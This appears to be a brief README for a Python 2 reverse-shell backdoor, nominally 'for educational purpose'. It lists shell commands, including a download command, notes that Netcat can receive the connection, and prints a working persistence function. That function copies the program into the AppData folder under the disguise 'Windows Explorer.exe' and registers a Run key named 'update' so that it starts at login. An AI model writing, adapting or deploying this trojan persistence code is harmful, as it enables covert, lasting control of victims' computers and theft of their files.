Made for educational porpuse 
Reverse Shell Backdoor made with Python2 using Socket
TCp/Ip Server
Can use The TCPip server or use Netcat
Commands of the Shell:
"cd"
"pwd"
"descargar"
"exit"
Can be persistent like a trojan
using shutil

def become_Persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d + "'+ evil_file_location + '"', shell = True)
